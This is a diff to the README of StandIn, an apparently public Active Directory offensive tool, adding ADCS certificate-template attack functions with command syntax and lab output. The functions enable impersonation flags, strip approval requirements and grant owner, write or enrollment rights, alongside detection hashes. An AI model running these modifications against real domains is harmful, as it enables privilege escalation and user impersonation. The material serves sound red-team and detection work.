@@ -36,6 +36,7 @@ The following items are currently on the radar for implementation in subsequent 
 - Powermad (by [@kevin_robertson](https://twitter.com/kevin_robertson)) - [here](https://github.com/Kevin-Robertson/Powermad)
 - SharpGPOAbuse (by [@den_n1s](https://twitter.com/den_n1s) & [@pkb1s](https://twitter.com/pkb1s)) - [here](https://github.com/FSecureLABS/SharpGPOAbuse)
 - adidnsdump (by [@_dirkjan](https://twitter.com/_dirkjan)) - [here](https://github.com/dirkjanm/adidnsdump)
+- Certified Pre-Owned (by [@harmj0y](https://twitter.com/harmj0y) & [@tifkin_](https://twitter.com/tifkin_)) - [here](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
 
 # Index
 - [Help](#help)
@@ -72,6 +73,14 @@ The following items are currently on the radar for implementation in subsequent 
     - [Delete machine object](#delete-machine-object)
     - [Add msDS-AllowedToActOnBehalfOfOtherIdentity](#add-msds-allowedtoactonbehalfofotheridentity)
     - [Remove msDS-AllowedToActOnBehalfOfOtherIdentity](#remove-msds-allowedtoactonbehalfofotheridentity)
+- [Active Directory Certificate Services (ADCS)](#active-directory-certificate-services-adcs)
+	- [List](#list)
+	- [Client Authentication](#client-authentication)
+	- [ENROLLEE_SUPPLIES_SUBJECT](#enrollee_supplies_subject)
+	- [PEND_ALL_REQUESTS](#pend_all_requests)
+	- [Change Owner](#change-owner)
+	- [Add Write Permission](#add-write-permission)
+	- [Add Certificate-Enrollment Permission](#add-certificate-enrollment-permission)
 - [Detection](#detection)
 - [Special Thanks](#special-thanks)
 
@@ -80,7 +89,7 @@ The following items are currently on the radar for implementation in subsequent 
 ```
   __
  ( _/_   _//   ~b33f
-__)/(//)(/(/)  v1.2
+__)/(//)(/(/)  v1.3
 
 
  >--~~--> Args? <--~~--<
@@ -124,8 +133,15 @@ __)/(//)(/(/)  v1.2
 --delegation    Boolean, list accounts with unconstrained / constrained delegation
 --asrep         Boolean, list ASREP roastable accounts
 --dc            Boolean, list all domain controllers
---add           Boolean, context dependent group/spn
---remove        Boolean, context dependent msDS-AllowedToActOnBehalfOfOtherIdentity/group
+--adcs          List all CA's and all published templates
+--clientauth    Boolean, modify ADCS template to add/remove "Client Authentication"
+--ess           Boolean, modify ADCS template to add/remove "ENROLLEE_SUPPLIES_SUBJECT"
+--pend          Boolean, modify ADCS template to add/remove "PEND_ALL_REQUESTS"
+--owner         Boolean, modify ADCS template owner
+--write         Boolean, modify ADCS template, add/remove WriteDacl/WriteOwner/WriteProperty permission for NtAccount
+--enroll        Boolean, modify ADCS template, add/remove "Certificate-Enrollment" permission for NtAccount
+--add           Boolean, context dependent group/spn/adcs
+--remove        Boolean, context dependent msDS-AllowedToActOnBehalfOfOtherIdentity/group/adcs
 --make          Boolean, make machine; ms-DS-MachineAccountQuota applies
 --disable       Boolean, disable machine; should be the same user that created the machine
 --access        Boolean, list access permissions for object
@@ -237,6 +253,35 @@ StandIn.exe --group DAgon --ntaccount "REDHOOK\RCarter" --add --domain redhook -
 # Remove user from group
 StandIn.exe --group "Dunwich Council" --ntaccount "REDHOOK\WWhateley" --remove
 StandIn.exe --group DAgon --ntaccount "REDHOOK\RCarter" --remove --domain redhook --user RFludd --pass Cl4vi$Alchemi4e
+
+# List CA's and all published templates, optionally wildcard filter on template name
+StandIn.exe --adcs
+StandIn.exe --adcs --filter Kingsport
+StandIn.exe --adcs --domain redhook --user RFludd --pass Cl4vi$Alchemi4e
+
+# Add/remove "Client Authentication" from template pKIExtendedKeyUsage, filter should contain the exact name of the template
+StandIn.exe --adcs --filter Kingsport --clientauth --add
+StandIn.exe --adcs --filter Kingsport --clientauth --remove --domain redhook --user RFludd --pass Cl4vi$Alchemi4e
+
+# Add/remove "ENROLLEE_SUPPLIES_SUBJECT" from template msPKI-Certificate-Name-Flag, filter should contain the exact name of the template
+StandIn.exe --adcs --filter Kingsport --ess --add
+StandIn.exe --adcs --filter Kingsport --ess --remove --domain redhook --user RFludd --pass Cl4vi$Alchemi4e
+
+# Add/remove "PEND_ALL_REQUESTS" from template msPKI-Enrollment-Flag, filter should contain the exact name of the template
+StandIn.exe --adcs --filter Kingsport --pend --add
+StandIn.exe --adcs --filter Kingsport --pend --remove --domain redhook --user RFludd --pass Cl4vi$Alchemi4e
+
+# Change template owner, filter should contain the exact name of the template
+StandIn.exe --adcs --filter Kingsport --ntaccount "REDHOOK\MBWillett" --owner
+StandIn.exe --adcs --filter Kingsport --ntaccount "REDHOOK\MBWillett" --owner --domain redhook --user RFludd --pass Cl4vi$Alchemi4e
+
+# Grant NtAccount WriteDacl/WriteOwner/WriteProperty, filter should contain the exact name of the template
+StandIn.exe --adcs --filter Kingsport --ntaccount "REDHOOK\MBWillett" --write --add
+StandIn.exe --adcs --filter Kingsport --ntaccount "REDHOOK\MBWillett" --write --remove  --domain redhook --user RFludd --pass Cl4vi$Alchemi4e
+
+# Grant NtAccount "Certificate-Enrollment", filter should contain the exact name of the template
+StandIn.exe --adcs --filter Kingsport --ntaccount "REDHOOK\MBWillett" --enroll --add
+StandIn.exe --adcs --filter Kingsport --ntaccount "REDHOOK\MBWillett" --enroll --remove --domain redhook --user RFludd --pass Cl4vi$Alchemi4e
 
 # Create machine object
 StandIn.exe --computer Innsmouth --make
@@ -1663,15 +1708,565 @@ C:\> StandIn.exe --computer m-10-1909-03 --remove
 [+] msDS-AllowedToActOnBehalfOfOtherIdentity property removed..
 ```
 
+## Active Directory Certificate Services (ADCS)
+
+These are companion functions to [Certify](https://github.com/GhostPack/Certify). They can facilitate `template` attacks where the default template state is not usable out-of-the-box.
+
+### List
+
+#### Use Case
+
+> *This function can enumerate all `domain CA's` and will list all `published templates`. Optionally you can wildcard `--filter` on the full template name or a portion of the name.*
+
+#### Syntax
+
+Search all published templates and, in this case, `filter` the output to return only templates matching `web`.
+
+```
+C:\>StandIn.exe --adcs --filter web
+
+[+] Search Base  : LDAP://CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=redhook,DC=local
+
+[>] Certificate Authority  : redhook-RH-DC01-CA
+    |_ DNS Hostname        : RH-DC01.redhook.local
+    |_ Cert DN             : CN=redhook-RH-DC01-CA, DC=redhook, DC=local
+    |_ GUID                : e1885348-e2b3-4e02-9147-54c4c430bc53
+    |_ Published Templates : CrossCA
+                             DirectoryEmailReplication
+                             DomainControllerAuthentication
+                             KerberosAuthentication
+                             EFSRecovery
+                             EFS
+                             DomainController
+                             WebServer
+                             Machine
+                             User
+                             SubCA
+                             Administrator
+
+[>] Publishing CA          : redhook-RH-DC01-CA
+    |_ Template            : WebServer
+    |_ Schema Version      : 1
+    |_ pKIExpirationPeriod : 2 years
+    |_ pKIOverlapPeriod    : 6 weeks
+    |_ Enroll Flags        : NONE
+    |_ Name Flags          : ENROLLEE_SUPPLIES_SUBJECT
+    |_ pKIExtendedKeyUsage : Server Authentication
+    |_ Owner               : REDHOOK\Enterprise Admins
+    |_ Permission Identity : REDHOOK\Domain Admins
+    |  |_ Type             : Allow
+    |  |_ Permission       : CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner
+    |  |_ Object           : ANY
+    |_ Permission Identity : REDHOOK\Domain Users
+    |  |_ Type             : Allow
+    |  |_ Permission       : GenericAll
+    |  |_ Object           : ANY
+    |_ Permission Identity : REDHOOK\Enterprise Admins
+    |  |_ Type             : Allow
+    |  |_ Permission       : CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner
+    |  |_ Object           : ANY
+    |_ Permission Identity : REDHOOK\Domain Admins
+    |  |_ Type             : Allow
+    |  |_ Permission       : ReadProperty, WriteProperty, ExtendedRight
+    |  |_ Object           : Certificate-Enrollment
+    |_ Permission Identity : REDHOOK\Enterprise Admins
+    |  |_ Type             : Allow
+    |  |_ Permission       : ReadProperty, WriteProperty, ExtendedRight
+    |  |_ Object           : Certificate-Enrollment
+    |_ Created             : 11/24/2021 4:37:30 PM
+    |_ Modified            : 11/29/2021 1:57:16 PM
+```
+
+### Client Authentication
+
+#### Use Case
+
+> *In order to be able to generate certificates which can be used to impersonate Domain users, the certificate template `pKIExtendedKeyUsage` property has to contain the `Client Authentication` flag. With the appropriate `object permissions` this function allows the operator to add or remove that flag from the template.*
+
+#### Syntax
+
+Add/remove `Client Authentication` flag from the `WebServer` template. Here the `--filter` flag has to match the template name exactly.
+
+```
+C:\>StandIn.exe --adcs --filter WebServer --clientauth --add
+
+[+] Search Base  : LDAP://CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=redhook,DC=local
+
+[>] Publishing CA          : redhook-RH-DC01-CA
+    |_ Template            : WebServer
+    |_ Enroll Flags        : NONE
+    |_ Name Flags          : ENROLLEE_SUPPLIES_SUBJECT
+    |_ pKIExtendedKeyUsage : Server Authentication
+    |_ Created             : 11/24/2021 4:37:30 PM
+    |_ Modified            : 11/29/2021 2:40:06 PM
+
+[+] Adding pKIExtendedKeyUsage : Client Authentication
+    |_ Success
+
+C:\>StandIn.exe --adcs --filter WebServer --clientauth --remove
+
+[+] Search Base  : LDAP://CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=redhook,DC=local
+
+[>] Publishing CA          : redhook-RH-DC01-CA
+    |_ Template            : WebServer
+    |_ Enroll Flags        : NONE
+    |_ Name Flags          : ENROLLEE_SUPPLIES_SUBJECT
+    |_ pKIExtendedKeyUsage : Client Authentication
+    |                        Server Authentication
+    |_ Created             : 11/24/2021 4:37:30 PM
+    |_ Modified            : 11/29/2021 1:57:16 PM
+
+[+] Removing pKIExtendedKeyUsage : Client Authentication
+    |_ Success
+```
+
+### ENROLLEE_SUPPLIES_SUBJECT
+
+#### Use Case
+
+> *In order to be able to provide an arbitrary user identity when making certificate requests, the certificate template `msPKI-Certificate-Name-Flag` property has to contain the `ENROLLEE_SUPPLIES_SUBJECT` flag. With the appropriate `object permissions` this function allows the operator to add or remove that flag from the template.*
+
+#### Syntax
+
+Add/remove `ENROLLEE_SUPPLIES_SUBJECT` flag from the `WebServer` template. Here the `--filter` flag has to match the template name exactly.
+
+```
+C:\>StandIn.exe --adcs --filter WebServer --ess --add
+
+[+] Search Base  : LDAP://CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=redhook,DC=local
+
+[>] Publishing CA          : redhook-RH-DC01-CA
+    |_ Template            : WebServer
+    |_ Enroll Flags        : NONE
+    |_ Name Flags          : 0
+    |_ pKIExtendedKeyUsage : Client Authentication
+    |                        Server Authentication
+    |_ Created             : 11/24/2021 4:37:30 PM
+    |_ Modified            : 11/29/2021 2:50:34 PM
+
+[+] Adding msPKI-Certificate-Name-Flag : ENROLLEE_SUPPLIES_SUBJECT
+    |_ Success
+
+C:\>StandIn.exe --adcs --filter WebServer --ess --remove
+
+[+] Search Base  : LDAP://CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=redhook,DC=local
+
+[>] Publishing CA          : redhook-RH-DC01-CA
+    |_ Template            : WebServer
+    |_ Enroll Flags        : NONE
+    |_ Name Flags          : ENROLLEE_SUPPLIES_SUBJECT
+    |_ pKIExtendedKeyUsage : Client Authentication
+    |                        Server Authentication
+    |_ Created             : 11/24/2021 4:37:30 PM
+    |_ Modified            : 11/29/2021 2:40:08 PM
+
+[+] Removing msPKI-Certificate-Name-Flag : ENROLLEE_SUPPLIES_SUBJECT
+    |_ Success
+```
+
+### PEND_ALL_REQUESTS
+
+#### Use Case
+
+> *When the certificate template `msPKI-Enrollment-Flag` property contains the `PEND_ALL_REQUESTS` flag then all certificate requests are queued into a `pending` state and the `CA Certificate Manager` will have to approve those requests. This is not desirable from an attacker perspective. With the appropriate `object permissions` this function allows the operator to add or remove that flag from the template.*
+
+#### Syntax
+
+Add/remove `PEND_ALL_REQUESTS` flag from the `WebServer` template. Here the `--filter` flag has to match the template name exactly.
+
+```
+C:\>StandIn.exe --adcs --filter WebServer --pend --remove
+
+[+] Search Base  : LDAP://CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=redhook,DC=local
+
+[>] Publishing CA          : redhook-RH-DC01-CA
+    |_ Template            : WebServer
+    |_ Enroll Flags        : PEND_ALL_REQUESTS
+    |_ Name Flags          : ENROLLEE_SUPPLIES_SUBJECT
+    |_ pKIExtendedKeyUsage : Client Authentication
+    |                        Server Authentication
+    |_ Created             : 11/24/2021 4:37:30 PM
+    |_ Modified            : 11/29/2021 2:54:51 PM
+
+[+] Removing msPKI-Enrollment-Flag : PEND_ALL_REQUESTS
+    |_ Success
+
+C:\>StandIn.exe --adcs --filter WebServer --pend --add
+
+[+] Search Base  : LDAP://CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=redhook,DC=local
+
+[>] Publishing CA          : redhook-RH-DC01-CA
+    |_ Template            : WebServer
+    |_ Enroll Flags        : NONE
+    |_ Name Flags          : ENROLLEE_SUPPLIES_SUBJECT
+    |_ pKIExtendedKeyUsage : Client Authentication
+    |                        Server Authentication
+    |_ Created             : 11/24/2021 4:37:30 PM
+    |_ Modified            : 11/29/2021 2:50:37 PM
+
+[+] Adding msPKI-Enrollment-Flag : PEND_ALL_REQUESTS
+    |_ Success
+```
+
+### Change Owner
+
+#### Use Case
+
+> *In some special cases the operator may have `WriteOwner` permissions on the `template object`. Where other attacks are not possible, the operator can change the owner of the template which will grant the new owner `GenericAll` permissions over the template. This attack is not very desirable, see `caveats`.*
+
+#### Syntax
+
+Set the `Owner` of the `template object` to `REDHOOK\MBWillett`. Here the `--filter` flag has to match the template name exactly.
+
+```
+C:\>StandIn.exe --adcs --filter WebServer --ntaccount "REDHOOK\MBWillett" --owner
+
+[+] Search Base  : LDAP://CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=redhook,DC=local
+
+[>] Publishing CA          : redhook-RH-DC01-CA
+    |_ Template            : WebServer
+    |_ Enroll Flags        : NONE
+    |_ Name Flags          : ENROLLEE_SUPPLIES_SUBJECT
+    |_ pKIExtendedKeyUsage : Client Authentication
+    |                        Server Authentication
+    |_ Created             : 11/24/2021 4:37:30 PM
+    |_ Modified            : 11/29/2021 2:58:19 PM
+
+[+] Set object access rules
+
+[+] Changing template owner : REDHOOK\MBWillett
+    |_ Success
+
+C:\>StandIn.exe --adcs --filter WebServer
+
+[+] Search Base  : LDAP://CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=redhook,DC=local
+
+[>] Certificate Authority  : redhook-RH-DC01-CA
+    |_ DNS Hostname        : RH-DC01.redhook.local
+    |_ Cert DN             : CN=redhook-RH-DC01-CA, DC=redhook, DC=local
+    |_ GUID                : e1885348-e2b3-4e02-9147-54c4c430bc53
+    |_ Published Templates : CrossCA
+                             DirectoryEmailReplication
+                             DomainControllerAuthentication
+                             KerberosAuthentication
+                             EFSRecovery
+                             EFS
+                             DomainController
+                             WebServer
+                             Machine
+                             User
+                             SubCA
+                             Administrator
+
+[>] Publishing CA          : redhook-RH-DC01-CA
+    |_ Template            : WebServer
+    |_ Schema Version      : 1
+    |_ pKIExpirationPeriod : 2 years
+    |_ pKIOverlapPeriod    : 6 weeks
+    |_ Enroll Flags        : NONE
+    |_ Name Flags          : ENROLLEE_SUPPLIES_SUBJECT
+    |_ pKIExtendedKeyUsage : Client Authentication
+    |                        Server Authentication
+    |_ Owner               : REDHOOK\MBWillett
+    |_ Permission Identity : REDHOOK\Domain Admins
+    |  |_ Type             : Allow
+    |  |_ Permission       : CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner
+    |  |_ Object           : ANY
+    |_ Permission Identity : REDHOOK\Domain Users
+    |  |_ Type             : Allow
+    |  |_ Permission       : GenericAll
+    |  |_ Object           : ANY
+    |_ Permission Identity : REDHOOK\Enterprise Admins
+    |  |_ Type             : Allow
+    |  |_ Permission       : CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner
+    |  |_ Object           : ANY
+    |_ Permission Identity : REDHOOK\Domain Admins
+    |  |_ Type             : Allow
+    |  |_ Permission       : ReadProperty, WriteProperty, ExtendedRight
+    |  |_ Object           : Certificate-Enrollment
+    |_ Permission Identity : REDHOOK\Enterprise Admins
+    |  |_ Type             : Allow
+    |  |_ Permission       : ReadProperty, WriteProperty, ExtendedRight
+    |  |_ Object           : Certificate-Enrollment
+    |_ Created             : 11/24/2021 4:37:30 PM
+    |_ Modified            : 11/29/2021 3:05:45 PM
+```
+
+#### Caveats
+
+This attack comes with some extra constraints. In lab testing I found that when a `user context` had the `WriteOwner` privilege then that user could `only change the Owner to themselves` providing any other user identity caused the request to fail. Additionally, once changed, the owner could not be reverted to it's old sate unless executing from an `Enterprise Admins` context.
+
+These restraints make this attack undesirable, it should only be used if no other options are available. In order to revert back to the old `Owner` the operator can generate a certificate for an `Enterprise Admins` user and use that the change the owner back.
+
+```
+# WebServer owned by REDHOOK\MBWillett & executing as "REDHOOK\MBWillett"
+C:\>StandIn.exe --adcs --filter WebServer --ntaccount "REDHOOK\Enterprise Admins" --owner
+
+[+] Search Base  : LDAP://CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=redhook,DC=local
+
+[>] Publishing CA          : redhook-RH-DC01-CA
+    |_ Template            : WebServer
+    |_ Enroll Flags        : NONE
+    |_ Name Flags          : ENROLLEE_SUPPLIES_SUBJECT
+    |_ pKIExtendedKeyUsage : Client Authentication
+    |                        Server Authentication
+    |_ Created             : 11/24/2021 4:37:30 PM
+    |_ Modified            : 11/29/2021 4:18:21 PM
+
+[+] Set object access rules
+
+[+] Changing template owner : REDHOOK\Enterprise Admins
+[!] Failed to modify ADCS permissions..
+    |_ A constraint violation occurred.
+
+# WebServer owned by REDHOOK\MBWillett & executing in "REDHOOK\Enterprise Admins" context
+C:\>StandIn.exe --adcs --filter WebServer --ntaccount "REDHOOK\Enterprise Admins" --owner
+
+[+] Search Base  : LDAP://CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=redhook,DC=local
+
+[>] Publishing CA          : redhook-RH-DC01-CA
+    |_ Template            : WebServer
+    |_ Enroll Flags        : NONE
+    |_ Name Flags          : ENROLLEE_SUPPLIES_SUBJECT
+    |_ pKIExtendedKeyUsage : Client Authentication
+    |                        Server Authentication
+    |_ Created             : 11/24/2021 4:37:30 PM
+    |_ Modified            : 11/29/2021 3:05:45 PM
+
+[+] Set object access rules
+
+[+] Changing template owner : REDHOOK\Enterprise Admins
+    |_ Success
+```
+
+### Add Write Permission
+
+#### Use Case
+
+> *Template write permissions may be necessary to perform some of the other outlined `template attacks`. With the appropriate `object permissions` this function allows the operator to add or remove `WriteDacl` / `WriteOwner` / `WriteProperty` permissions from an `NtAccount` on the `template object`.*
+
+#### Syntax
+
+Add/remove `Write` permissions over the `WebServer` template for `REDHOOK\MBWillett`. Here the `--filter` flag has to match the template name exactly.
+
+```
+C:\>StandIn.exe --adcs --filter WebServer --ntaccount "REDHOOK\MBWillett" --write --add
+
+[+] Search Base  : LDAP://CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=redhook,DC=local
+
+[>] Publishing CA          : redhook-RH-DC01-CA
+    |_ Template            : WebServer
+    |_ Enroll Flags        : NONE
+    |_ Name Flags          : ENROLLEE_SUPPLIES_SUBJECT
+    |_ pKIExtendedKeyUsage : Client Authentication
+    |                        Server Authentication
+    |_ Created             : 11/24/2021 4:37:30 PM
+    |_ Modified            : 11/29/2021 3:15:44 PM
+
+[+] Set object access rules
+
+[+] Adding write permissions : REDHOOK\MBWillett
+    |_ Success
+
+C:\>StandIn.exe --adcs --filter WebServer
+
+[+] Search Base  : LDAP://CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=redhook,DC=local
+
+[>] Certificate Authority  : redhook-RH-DC01-CA
+    |_ DNS Hostname        : RH-DC01.redhook.local
+    |_ Cert DN             : CN=redhook-RH-DC01-CA, DC=redhook, DC=local
+    |_ GUID                : e1885348-e2b3-4e02-9147-54c4c430bc53
+    |_ Published Templates : CrossCA
+                             DirectoryEmailReplication
+                             DomainControllerAuthentication
+                             KerberosAuthentication
+                             EFSRecovery
+                             EFS
+                             DomainController
+                             WebServer
+                             Machine
+                             User
+                             SubCA
+                             Administrator
+
+[>] Publishing CA          : redhook-RH-DC01-CA
+    |_ Template            : WebServer
+    |_ Schema Version      : 1
+    |_ pKIExpirationPeriod : 2 years
+    |_ pKIOverlapPeriod    : 6 weeks
+    |_ Enroll Flags        : NONE
+    |_ Name Flags          : ENROLLEE_SUPPLIES_SUBJECT
+    |_ pKIExtendedKeyUsage : Client Authentication
+    |                        Server Authentication
+    |_ Owner               : REDHOOK\Enterprise Admins
+    |_ Permission Identity : REDHOOK\Domain Admins
+    |  |_ Type             : Allow
+    |  |_ Permission       : CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner
+    |  |_ Object           : ANY
+    |_ Permission Identity : REDHOOK\Domain Users
+    |  |_ Type             : Allow
+    |  |_ Permission       : GenericAll
+    |  |_ Object           : ANY
+    |_ Permission Identity : REDHOOK\Enterprise Admins
+    |  |_ Type             : Allow
+    |  |_ Permission       : CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner
+    |  |_ Object           : ANY
+    |_ Permission Identity : REDHOOK\MBWillett
+    |  |_ Type             : Allow
+    |  |_ Permission       : WriteProperty, WriteDacl, WriteOwner
+    |  |_ Object           : ANY
+    |_ Permission Identity : REDHOOK\Domain Admins
+    |  |_ Type             : Allow
+    |  |_ Permission       : ReadProperty, WriteProperty, ExtendedRight
+    |  |_ Object           : Certificate-Enrollment
+    |_ Permission Identity : REDHOOK\Enterprise Admins
+    |  |_ Type             : Allow
+    |  |_ Permission       : ReadProperty, WriteProperty, ExtendedRight
+    |  |_ Object           : Certificate-Enrollment
+    |_ Created             : 11/24/2021 4:37:30 PM
+    |_ Modified            : 11/29/2021 3:29:36 PM
+
+C:\>StandIn.exe --adcs --filter WebServer --ntaccount "REDHOOK\MBWillett" --write --remove
+
+[+] Search Base  : LDAP://CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=redhook,DC=local
+
+[>] Publishing CA          : redhook-RH-DC01-CA
+    |_ Template            : WebServer
+    |_ Enroll Flags        : NONE
+    |_ Name Flags          : ENROLLEE_SUPPLIES_SUBJECT
+    |_ pKIExtendedKeyUsage : Client Authentication
+    |                        Server Authentication
+    |_ Created             : 11/24/2021 4:37:30 PM
+    |_ Modified            : 11/29/2021 3:29:36 PM
+
+[+] Set object access rules
+
+[+] Removing write permissions : REDHOOK\MBWillett
+    |_ Success
+```
+
+### Add Certificate-Enrollment Permission
+
+#### Use Case
+
+> *To be able to request `template certificates` the `requestor` has to have `Certificate-Enrollment` permissions. With the appropriate `object permissions` this function allows the operator to add or remove `Certificate-Enrollment` permissions from an `NtAccount` on the `template object`.*
+
+#### Syntax
+
+Add/remove `Certificate-Enrollment` permissions on the `WebServer` template for `REDHOOK\MBWillett`. Here the `--filter` flag has to match the template name exactly.
+
+```
+C:\>StandIn.exe --adcs --filter WebServer --ntaccount "REDHOOK\MBWillett" --enroll --add
+
+[+] Search Base  : LDAP://CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=redhook,DC=local
+
+[>] Publishing CA          : redhook-RH-DC01-CA
+    |_ Template            : WebServer
+    |_ Enroll Flags        : NONE
+    |_ Name Flags          : ENROLLEE_SUPPLIES_SUBJECT
+    |_ pKIExtendedKeyUsage : Client Authentication
+    |                        Server Authentication
+    |_ Created             : 11/24/2021 4:37:30 PM
+    |_ Modified            : 11/29/2021 3:29:57 PM
+
+[+] Set object access rules
+
+[+] Adding Certificate-Enrollment permission : REDHOOK\MBWillett
+    |_ Success
+
+C:\>StandIn.exe --adcs --filter WebServer
+
+[+] Search Base  : LDAP://CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=redhook,DC=local
+
+[>] Certificate Authority  : redhook-RH-DC01-CA
+    |_ DNS Hostname        : RH-DC01.redhook.local
+    |_ Cert DN             : CN=redhook-RH-DC01-CA, DC=redhook, DC=local
+    |_ GUID                : e1885348-e2b3-4e02-9147-54c4c430bc53
+    |_ Published Templates : CrossCA
+                             DirectoryEmailReplication
+                             DomainControllerAuthentication
+                             KerberosAuthentication
+                             EFSRecovery
+                             EFS
+                             DomainController
+                             WebServer
+                             Machine
+                             User
+                             SubCA
+                             Administrator
+
+[>] Publishing CA          : redhook-RH-DC01-CA
+    |_ Template            : WebServer
+    |_ Schema Version      : 1
+    |_ pKIExpirationPeriod : 2 years
+    |_ pKIOverlapPeriod    : 6 weeks
+    |_ Enroll Flags        : NONE
+    |_ Name Flags          : ENROLLEE_SUPPLIES_SUBJECT
+    |_ pKIExtendedKeyUsage : Client Authentication
+    |                        Server Authentication
+    |_ Owner               : REDHOOK\Enterprise Admins
+    |_ Permission Identity : REDHOOK\Domain Admins
+    |  |_ Type             : Allow
+    |  |_ Permission       : CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner
+    |  |_ Object           : ANY
+    |_ Permission Identity : REDHOOK\Domain Users
+    |  |_ Type             : Allow
+    |  |_ Permission       : GenericAll
+    |  |_ Object           : ANY
+    |_ Permission Identity : REDHOOK\Enterprise Admins
+    |  |_ Type             : Allow
+    |  |_ Permission       : CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner
+    |  |_ Object           : ANY
+    |_ Permission Identity : REDHOOK\Domain Admins
+    |  |_ Type             : Allow
+    |  |_ Permission       : ReadProperty, WriteProperty, ExtendedRight
+    |  |_ Object           : Certificate-Enrollment
+    |_ Permission Identity : REDHOOK\Enterprise Admins
+    |  |_ Type             : Allow
+    |  |_ Permission       : ReadProperty, WriteProperty, ExtendedRight
+    |  |_ Object           : Certificate-Enrollment
+    |_ Permission Identity : REDHOOK\MBWillett
+    |  |_ Type             : Allow
+    |  |_ Permission       : ExtendedRight
+    |  |_ Object           : Certificate-Enrollment
+    |_ Created             : 11/24/2021 4:37:30 PM
+    |_ Modified            : 11/29/2021 3:38:36 PM
+
+C:\>StandIn.exe --adcs --filter WebServer --ntaccount "REDHOOK\MBWillett" --enroll --remove
+
+[+] Search Base  : LDAP://CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=redhook,DC=local
+
+[>] Publishing CA          : redhook-RH-DC01-CA
+    |_ Template            : WebServer
+    |_ Enroll Flags        : NONE
+    |_ Name Flags          : ENROLLEE_SUPPLIES_SUBJECT
+    |_ pKIExtendedKeyUsage : Client Authentication
+    |                        Server Authentication
+    |_ Created             : 11/24/2021 4:37:30 PM
+    |_ Modified            : 11/29/2021 3:38:36 PM
+
+[+] Set object access rules
+
+[+] Removing Certificate-Enrollment permission : REDHOOK\MBWillett
+    |_ Success
+```
+
 ## Detection
 
-This outlines a number of IOC's which can aid in the detection engineering process for StandIn.
+This section outlines a number of IOC's which can aid in the detection engineering process for StandIn.
 
 #### Release Package Hashes
 
 The following table maps the release package hashes for StandIn.
 
 ```
+-=v1.3=-
+StandIn_Net35.exe    SHA256: C2ACD3667483E5AC1E423E482DBA462E96DA3978776BFED07D9B436FEE135AB2
+                        MD5: 5E9364F46723B7DC5FF24DE6E9C69E76
+
+StandIn_Net45.exe    SHA256: 2E37A3D2DC2ECB0BD026C93055A71CAB4E568B062B1C9F7B8846E04DF1E9F3E6
+                        MD5: 566FFA0555E81560407B8CE6E458E829
+
 -=v1.2=-
 StandIn_Net35.exe    SHA256: DCCDA4991BEBC5F2399C47C798981E7828ECC2BA77ED52A1D37BD866AD5582AA
                         MD5: D11A8CC4768221CEB5A128A349C5E094
